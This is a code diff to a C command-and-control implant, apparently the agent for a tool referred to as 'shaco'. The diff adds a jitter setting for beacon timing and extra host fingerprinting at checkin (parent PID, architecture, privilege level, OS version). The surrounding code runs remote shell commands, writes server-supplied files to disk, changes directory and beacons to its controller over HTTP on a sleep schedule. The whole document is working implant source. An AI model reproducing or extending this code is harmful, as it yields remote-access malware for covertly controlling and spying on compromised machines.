@@ -14,8 +14,9 @@ enum{
     COMMAND_PWD = 92,
     COMMAND_UPLOAD = 93,
     COMMAND_SLEEP = 95,
+    COMMAND_JITTER = 96,
     COMMAND_EXIT = 94,
-    COMMAND_CHECKIN = 12
+    COMMAND_CHECKIN = 12,
 };
 
 PPACKER shell_command(uint8_t *args);
@@ -25,6 +26,7 @@ PPACKER pwd_command(uint8_t *args);
 PPACKER upload_command(uint8_t *args);
 PPACKER exit_command(uint8_t *args);
 PPACKER sleep_command(uint8_t *args);
+PPACKER jitter_command(uint8_t *args);
 
 COMMAND commands[] = {
     {
@@ -56,6 +58,10 @@ COMMAND commands[] = {
         .fun = upload_command
     },
     {
+        .id = COMMAND_JITTER,
+        .fun = jitter_command
+    },
+    {
         .id  = -1,
         .fun = NULL
     }
@@ -65,10 +71,12 @@ PPACKER exec_command(uint8_t *args, int id){
     for(int i = 0; commands[i].id != -1; ++i){
         if(commands[i].id == id){
             MSG("Calling function id: %d", id);
-            return commands[i].fun(args + sizeof(uint32_t));
+            PPACKER pack = commands[i].fun(args + sizeof(int32_t));
+            MSG("command called");
+            return pack;
         }
     }
-    MSG("command not found");
+    MSG("command not found: %d", id);
     return NULL; 
 }
 
@@ -95,14 +103,18 @@ bool checkin(){
     packer_add_string(packer, os_config->domain);
     packer_add_string(packer, os_config->internal_ip);
     packer_add_int32(packer, os_config->pid);
+    packer_add_int32(packer, getppid());
+    packer_add_string(packer, os_config->arch);
     packer_add_int32(packer, os_config->elevated);
+    packer_add_string(packer, os_config->version);
     packer_add_int32(packer, sett->timeout);
+    packer_add_int32(packer, sett->max_timeout);
     
-    MSG("Sending Packet Size: %zu", packer_get_size(packer));
-    PHTTP_RESPONSE resp = http_post(sett->ip, sett->domain, sett->endpoint, sett->useragent, sett->port, sett->ssl, packer_get_buffer(packer), packer_get_size(packer));
+    MSG("Sending Packet Size: %llu", packer_get_size(packer));
+    PHTTP_RESPONSE resp = http_post(packer_get_buffer(packer), packer_get_size(packer));
     if(!resp) { MSG("Error on send http post "); goto EXIT;}
 
-    size_t offset = 0;
+    uint64_t offset = 0;
     
     int command_response = packer_get_int32((uint8_t *)resp->response, &offset);
     if(command_response != COMMAND_OK) { MSG("Command not ok... Response: %s | Command Size: %zu", resp->response, resp->size); goto EXIT;}
@@ -111,10 +123,10 @@ bool checkin(){
     status = true;
 
 EXIT:
-    if(!resp) http_free(resp);
-    packer_free(packer);
+    if(resp) http_free(resp);
+    if(packer) packer_free(packer);
+    if(os_config) osconfig_free(os_config);
     return status;
-
 }
 
 PPACKER checkin_command(uint8_t *args){
@@ -156,7 +168,7 @@ char *s_exec(char *cmd, size_t *size) {
 }
 
 PPACKER shell_command(uint8_t *args){
-    size_t offset = 0;
+    uint64_t offset = 0;
     char *command = NULL;
     char *response = NULL;
     command = packer_get_string(args, &offset);
@@ -179,11 +191,17 @@ PPACKER shell_command(uint8_t *args){
 
 
 PPACKER cd_command(uint8_t *args){
-    size_t offset = 0;
+    uint64_t offset = 0;
     char *path = NULL;
+    uint32_t len = 0;
+
     path = packer_get_string(args, &offset);
-    MSG("change to dir: %s", path);
-    if(chdir(path) != 0) MSG("can't change directory");
+    if(!path) {MSG("error in get path string..."); return NULL;}
+
+    path[StringLength(path) -1 ] = '\0';
+    MSG("moving to path: %s:%zu", path, StringLength(path));
+
+    if(chdir(path) != 0){ MSG("can't change directory: ");}
     return NULL;
 }
 
@@ -195,15 +213,14 @@ PPACKER pwd_command(uint8_t *args){
     return pack;
 }
 
-//TODO: in get data is used int32, limits the file size....
 PPACKER upload_command(uint8_t *args){
-    size_t offset = 0;
+    uint64_t offset = 0;
     uint64_t data_len = 0;
     char *filepath = packer_get_string(args,&offset);
-    uint8_t *data = packer_get_data64(args, &data_len, &offset);
+    void *data = packer_get_data64(args, &data_len, &offset);
     if(!filepath || !data) { MSG("Can't download the file"); return NULL;}
 
-    MSG("Trying download remote file to path: %s | len: %zu", filepath, data_len);
+    MSG("Trying download remote file to path: %s | len: %llu", filepath, data_len);
 
     PPACKER pack = packer_init();
     FILE *f = fopen(filepath, "wb");
@@ -215,18 +232,25 @@ PPACKER upload_command(uint8_t *args){
 }
 
 PPACKER exit_command(uint8_t *args){
-    PSETTINGS cfg = get_settings();
-    cfg->quit = true;
+    _exit(0); //TODO: change to shaco_exit
     return NULL;
 }
 
 PPACKER sleep_command(uint8_t *args){
     PSETTINGS sett = get_settings();
-    size_t offset = 0;
+    uint64_t offset = 0;
     uint32_t value = packer_get_int32(args, &offset);
     if(value > 0){
         MSG("Setting sleep to value: %d", value);
         sett->timeout = value;
     }else MSG("Can't set the sleep value to: %d", value);
         return NULL;
+}
+
+PPACKER jitter_command(uint8_t *args){
+    PSETTINGS sett = get_settings();
+    uint64_t offset = 0;
+    uint32_t value = packer_get_int32(args, &offset);
+    sett->max_timeout = value;
+    return NULL;
 }
